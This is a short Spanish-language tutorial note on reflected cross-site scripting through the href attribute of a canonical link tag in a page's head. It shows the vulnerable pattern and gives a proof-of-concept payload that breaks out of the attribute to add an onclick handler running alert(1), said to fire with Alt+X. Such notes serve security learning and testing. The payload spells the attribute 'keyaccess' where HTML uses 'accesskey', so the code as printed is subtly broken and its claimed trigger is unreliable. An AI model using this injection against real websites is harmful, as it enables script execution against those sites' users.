Esta inyeccion ocurre dentro del atributo href en la etiqueta \<link> que a su vez está dentro de las etiquetas \<head>, la etiqueta link con el atributo rel "canonical", se usa cuando hay una misma pagina con diferentes URL's, esto es para que los navegadores sepan cual es la pagina principal y que paginas indexar en el navegador, un ejemplo de como se ve esta etiqueta:

```html
<head>

<link rel='canonical' href='http://urlactual/'>

</head>
```

El problema es cuando como usuarios tenemos control de esto, y podemos modificar la URL a nuestra conveniencia para realizar una inyección XSS un ejemplo de esto es lo siguiente:

### La URL

```http
http://url/?foo=XSS
```

### Resultado en canonical link

```html
<head>

<link rel='canonical' href='http://url/?foo=XSS'>

</head>
```

El payload quedaría algo así:

```http
http://url/?foo='keyaccess='x'onclick='alert(1)
```

Y el resultado en el codigo fuente seria el siguiente: 


```html
<head>

<link rel='canonical' href='http://url/?foo='keyaccess='x'onclick='alert(1)'>

</head>
```

==Para ejecutar el XSS solo se necesitaria hacer Alt + x==


